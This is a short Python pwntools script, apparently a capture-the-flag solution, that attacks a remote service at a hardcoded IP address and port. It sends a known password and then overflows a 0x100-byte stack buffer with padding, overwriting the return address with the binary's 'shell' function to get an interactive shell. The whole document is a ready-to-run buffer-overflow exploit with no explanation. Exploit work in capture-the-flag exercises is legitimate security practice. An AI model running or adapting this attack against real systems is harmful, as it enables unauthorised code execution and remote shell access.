from pwn import *

p = remote("159.223.101.241", 31337)
e = ELF("./pwnrace")
context.log_level = 'debug'

pl = b''
pl += b'hAcK_Th3_Pl@n3t\n'
pl += b'A' * (0x100 - len(pl)) + b'B' * 0x8
pl += p64(e.sym['shell'])

# pause()
p.sendlineafter(b"Enter Password:\n", pl)

p.interactive()